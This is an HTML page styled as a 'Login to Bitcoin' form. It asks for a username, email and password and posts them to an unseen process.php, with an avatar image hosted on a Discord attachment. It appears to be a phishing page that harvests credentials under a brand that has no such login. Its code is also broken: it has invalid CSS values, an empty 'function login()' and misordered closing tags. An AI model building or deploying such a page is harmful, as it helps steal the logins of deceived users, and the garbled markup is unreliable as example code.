<html>
<head>
<title>login to Bitcoin</title>
</head>

<body>

<style>

body{

  margin: 0;

  padding: 0;

  font-family: sans-serif;

  background: #34495e;

}

.box{

  width: 300px;

  padding: 40px;

  position: absolute;

  top: 50%;

  left: 50%;

  transform: translate(-50%,-50%);

  background: #191919;

  text-align: center;

}

.box h1{

  color: white;

  text-transform: uppercase;

  font-weight: 500;

}

.box input[type = "text"],.box input[type = "password"]{

  border:0;

  background: none;

  display: block;

  margin: 20px auto;

  text-align: center;

  border: 2px solid #3498db;

  padding: 14px 10px;

  width: 200px;

  outline: none;

  color: white;

  border-radius: 24px;

  transition: 0.25s;

}

.box input[type = "text"]:focus,.box input[type = "password"]:focus{

  width: 280px;

  border-color: #2ecc71;

}

.box input[type = "submit"]{

  border:0;

  background: none;

  display: block;

  margin: 20px auto;

  text-align: center;

  border: 2px solid #2ecc71;

  padding: 14px 40px;

  outline: none;

  color: white;

  border-radius: 24px;

  transition: 0.25s;

  cursor: pointer;

}

.box input[type = "submit"]:hover{

  background: #2ecc71;

}

.box input[type = "text"],.box input[type = "email"] {

  border:0;

  background: none;

  display: block;

  margin: 20px auto;

  text-align: center;

  border: 2px solid #3498db;

  padding: 14px 10px;

  width: 200px;

  outline: none;

  color: white;

  border-radius: 24px;

  transition: 0.25s;

}

.box input[type = "text"]:focus,.box input[type = "email"]:focus{

  width: 280px;

  border-color: #2ecc71;

}

.box input[type = "text"],.box input[type = "username"]{

  border:0;

  background: none;

  display: block;

  margin: 20px auto;

  text-align: center;

  border: 2px solid #3498db;

  padding: 14px 10px;

  width: 200px;

  outline: none;

  color: white;

  border-radius: 24px;

  transition: 0.25s;

}

.box input[type = "text"]:focus,.box input[type = "username"]:focus{

  width: 280px;

  border-color: #2ecc71;

}

.avatar{
    width: 300px;
    height: 300px;
    border-radius: 50%;
    position: absolute;
    top: -----000000000000000001px;
    left: calc(50% - 50px);
    down: -50px
    
}


</style>
<div class="imgcontainer">
    <img src="https://media.discordapp.net/attachments/808250882718040084/888122306986119238/QK_1630713151328.png" alt="Avatar" class="avatar">
  </div>

<form class="box" action="./process.php" method="post">

  <h1>Login to Bitcoin</h1>

  <input type="username" id="username" name="username" placeholder="Username">
  <input type="email" id="email" name 
  ="email" placeholder="Email">

  <input type="password" id="password" name="password" placeholder="Password">

  <input type="submit" name="login" value="Login">

</form>
</div>

<script> 
function login()
</script>
</html>
</body>